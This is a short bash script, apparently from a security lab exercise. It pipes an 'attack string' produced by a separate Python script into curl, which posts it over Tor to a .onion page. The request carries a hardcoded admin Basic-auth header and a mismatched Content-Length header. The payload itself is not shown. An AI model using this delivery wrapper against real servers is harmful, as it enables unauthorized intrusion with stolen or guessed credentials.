#! /bin/bash

#Executing the python script to get the attack string and sending it over to the curl command (send -n 2p is needed because the python script outputs some data whenever a request is made. Because we have no control over that, we choose to ignore these lines with sed so we can keep only the attack sting). The curl parameters are explained in detail in the README.md file.

echo -en $(python3 request_2.py | sed -n 2p) \
   | curl --socks5-hostname localhost:9150 \
    'zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' \
    -X POST -i \
    -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==' \
    --data-binary @- \
    -H 'Content-Length: 0'
